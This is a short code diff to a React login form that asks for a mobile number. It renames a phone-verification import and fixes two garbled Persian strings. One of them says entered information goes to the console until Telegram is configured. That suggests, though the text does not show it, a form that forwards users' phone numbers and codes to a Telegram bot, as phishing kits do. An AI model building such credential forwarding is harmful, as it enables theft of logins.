@@ -30,7 +30,7 @@ import {
   setUserCurrentStep,
   canAccessAuthStep,
   getSession,
-  updatePhoneVerification,
+  updatePhoneVerificationCode,
   showAdminButtons,
 } from "@/lib/telegram-service-enhanced";
 import {
@@ -698,7 +698,7 @@ export const LoginForm = () => {
                 {!validateTelegramConfig() && (
                   <AlertMessage>
                     🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی
-                    تلگرام، فایل .env را تن��یم کنید.
+                    تلگرام، فایل .env را تنظیم کنید.
                   </AlertMessage>
                 )}
 
@@ -740,7 +740,7 @@ export const LoginForm = () => {
                       color: "rgb(0, 0, 0)",
                     }}
                   >
-                    شماره همراه را وارد ک��ید.
+                    شماره همراه را وارد کنید.
                   </label>
                   <div style={{ position: "relative" }}>
                     <Input
